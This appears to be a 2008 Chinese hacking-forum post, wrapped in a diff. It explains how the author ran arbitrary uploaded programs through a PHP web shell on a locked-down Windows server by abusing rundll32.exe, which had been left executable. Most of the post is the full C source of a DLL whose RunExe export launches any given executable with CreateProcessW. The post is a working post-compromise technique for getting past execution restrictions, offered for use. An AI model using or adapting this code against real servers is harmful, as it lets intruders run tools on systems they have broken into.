@@ -1,0 +1,137 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+艰难的在webshell中执行程序
+D8888D主贴内容-------------------------------------------------------
+摘要：一个web shell，系统权限设置得很好，常用的exe都无权执行。可写目录传上去的exe文件，也没有执行权限。最终发现设置权限的时候漏掉了rundll32.exe，如是就写了这个个代码。
+
+      测试开始的时候，PHP似乎没权执行命令。本来打算用php本身的一些溢出问题，溢出一个低权限的shell来的。后来意外发现使用proc_open函数可以执行一些内部命令，只是外部命令和目录都做了比较严格的权限设置而已。于是就测试可能可以利用的外部命令，最终测试到了rundll32.exe程序，终于没有返回权限不足。写一个dll，给rundll32调用，就可以间接的执行自己上传的任意exe文件了。也许是windows权限的一点小问题？毕竟使用rundll32间接执行的exe，身份还是php shell的guest权限，虽然调用者变了——真正原因有待进一步研究。 /*************************************************************************************************
+
+* 遇到一个服务器权限设置很畸形，系统exe基本都无法执行，自己上传的exe到可写目录，也不能执行。
+
+* 遗憾的是，他们漏掉了rundll32.exe这个文件的权限，如是……
+
+* code by wustyunshu###hotmail.com, 2008,11,13,23:20
+
+*************************************************************************************************/
+
+
+
+#include <stdio.h>
+
+#include <stdlib.h>
+
+#include <windows.h>
+
+
+
+// dll入口
+
+BOOL APIENTRY DllMain( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
+
+{
+
+return true;
+
+}
+
+
+
+void RunExe( HWND hwnd, HINSTANCE hinst, LPSTR szCmdLine, int nCmdShow)
+
+{
+
+if( szCmdLine == NULL )
+
+{
+
+return;
+
+}
+
+
+
+DWORD dwNum = MultiByteToWideChar(CP_ACP, 0, szCmdLine, -1, NULL, 0);
+
+wchar_t *wszCmdLine = new wchar_t[dwNum];
+
+if(!wszCmdLine)
+
+{
+
+return;
+
+}
+
+MultiByteToWideChar(CP_ACP, 0, szCmdLine, -1, wszCmdLine, dwNum);
+
+
+
+int argc;
+
+LPWSTR *argv = CommandLineToArgvW( wszCmdLine, &argc );
+
+
+
+wchar_t Cmd[256] = { 0 };
+
+wchar_t Args[1024] = { 0 };
+
+
+
+//strncpy( Cmd, argv[0], sizeof(Cmd)-1 );
+
+wcsncpy( Cmd, argv[0], sizeof(Cmd)-1 );
+
+if( argc > 1 )
+
+{
+
+for( int index = 1; index < argc; index ++ )
+
+{
+
+wcscat( wcscat( Args, L" " ), argv[index] );
+
+}
+
+}
+
+
+
+STARTUPINFO si;
+
+memset( (void *)&si, 0, sizeof(STARTUPINFOA) );
+
+GetStartupInfoW( &si );
+
+
+
+//新进程输入输出重定向
+
+si.cb = sizeof( si );
+
+si.dwFlags = STARTF_USESHOWWINDOW;
+
+//si.wShowWindow = SW_HIDE;
+
+
+
+PROCESS_INFORMATION processInfo;
+
+memset( (void *)&processInfo, 0, sizeof(PROCESS_INFORMATION) );
+
+
+
+//建立进程
+
+CreateProcessW( Cmd, Args, NULL, NULL, 1, 0, NULL, NULL, &si, &processInfo );
+
+
+
+Sleep( 60 * 1000 );
+
+TerminateProcess( processInfo.hProcess, 0 );
+
+}
+复制代码
